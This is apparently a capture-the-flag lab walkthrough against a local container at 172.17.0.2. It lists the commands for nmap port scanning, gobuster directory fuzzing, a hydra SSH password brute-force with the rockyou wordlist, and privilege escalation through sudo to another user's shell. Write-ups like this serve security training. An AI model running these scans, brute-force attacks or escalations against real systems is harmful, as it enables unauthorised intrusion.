![image](https://github.com/user-attachments/assets/af9ec7bf-fe15-4772-b1c4-508c4f199375)

## **we start with the recognition**
```bash
ping -c 1 172.17.0.2
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
nmap -sCV -p22,80 172.17.0.2 -oN targeted
```
![Pasted image 20250121161633](https://github.com/user-attachments/assets/7d3cafff-96df-4a90-85b1-c725a982846f)
![Pasted image 20250121161650](https://github.com/user-attachments/assets/2e65d131-8f99-4bbe-9aa3-9f5d402f2f96)
![Pasted image 20250121161721](https://github.com/user-attachments/assets/ea036db8-1c10-40f1-bccb-0e66c76f91ae)

## **we have port 80 open and it is a web**

![Pasted image 20250121161753](https://github.com/user-attachments/assets/dc5c2fff-6364-4e0c-8ba6-629bf3240923)

## **there is nothing behind**

![Pasted image 20250121161819](https://github.com/user-attachments/assets/74398c0c-66b2-4e25-b795-32b7ba7d3ace)

## **Fuzzing Web**
```bash
gobuster dir -u http://IPVICTIMA/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt

gobuster dir -u http://IPVICTIMA/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x txt,py,php,sh
```

## **and we didn't find anything**

## **but we still have that information 'tails' that we can use**
```bash
hydra -l USER -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```
![Pasted image 20250121175748](https://github.com/user-attachments/assets/a0bb0efa-65ff-4db3-ba19-693d7559611d)

```bash
ssh tails@172.17.0.2
```
![Pasted image 20250121175952](https://github.com/user-attachments/assets/28c25736-3e4d-4715-b665-81a5bb940c58)

## **user sonic has no root password and has access to everything.**
```bash
sudo -u sonic /bin/bash
```
![Pasted image 20250121180150](https://github.com/user-attachments/assets/f0892a3b-d6cb-43c2-b878-61ac976046c0)





